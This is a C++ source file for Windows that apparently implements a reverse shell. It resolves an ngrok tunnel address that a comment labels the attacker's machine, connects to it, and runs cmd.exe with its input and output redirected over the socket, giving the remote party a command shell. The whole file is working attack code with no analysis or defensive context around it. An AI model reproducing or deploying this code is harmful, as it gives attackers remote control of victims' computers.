
#include <winsock2.h>
#include <windows.h>
#include <iostream>
#pragma comment(lib, "w2_32")



WSADATA wsaData;
SOCKET wSock;
struct sockaddr_in hax;
STARTUPINFO sui;
PROCESS_INFORMATION pi;

char* getAddr(char*);

int main(int argc, char* argv[])
{
  // listener ip, port on attacker's machine
  const char* ip = getAddr("0.tcp.ap.ngrok.io");
  short port = 11891;

  // init socket lib
  WSAStartup(MAKEWORD(2, 2), &wsaData);

  // create socket
  wSock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

  hax.sin_family = AF_INET;
  hax.sin_port = htons(port);
  hax.sin_addr.s_addr = inet_addr(ip);

  // connect to remote host
  WSAConnect(wSock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);

  memset(&sui, 0, sizeof(sui));
  sui.cb = sizeof(sui);
  sui.dwFlags = STARTF_USESTDHANDLES;
  sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE) wSock;

  // start cmd.exe with redirected streams
 
  CreateProcess(NULL, (LPSTR)"C:\\windows\\system32\\cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi);
  return 0;
}


char* getAddr(char* hostname){
  WSADATA ws;
    int res;
    // Initializing winsock
    // Before using any of the winsock constructs, the library must be initialized by calling the WSAStartup function. 
    res = WSAStartup ( MAKEWORD(2, 2), &ws );
    if ( res != 0 ){
      std::cout << "Failed to initialize winsock : " << res;
      exit(0);
  }
    
  // char * hostname;  
  struct hostent * host_info;
  struct in_addr addr;
  DWORD dw;
  int i = 0;
    
    // hostname = (char *)"0.tcp.ap.ngrok.io"; // hostname for which we want the IP address
    host_info = gethostbyname ( hostname ); // gethostbyname function retrieves host information.
  // gethostbyname returns a pointer of type struct hostent.
  //A null pointer is returned if an error occurs. The specific error number can be known by calling WSAGetLastError.
  
    if ( host_info == NULL ) {
      dw = WSAGetLastError ();
        if ( dw != 0 ) {
          if ( dw == WSAHOST_NOT_FOUND ) {
            std::cout << "Host is not found";
            exit(1);
          }
          else if ( dw == WSANO_DATA ) {
            std::cout << "No data record is found";
            exit(1);
          }
          else {
            std::cout << "Function failed with an error : " << dw;
            exit(1);
          }
        }
    }
  else {
    std::cout << "Hostname : " << host_info->h_name << std::endl;
    while ( host_info->h_addr_list[i] != 0 ){
      addr.s_addr = *(u_long *) host_info->h_addr_list[i++];
      std::cout<<"\nIP Address "<< inet_ntoa(addr); // inet_ntoa function converts IPv4 address to ASCII string in Internet standard dotted-decimal format.
    }
  }
  return inet_ntoa(addr);
}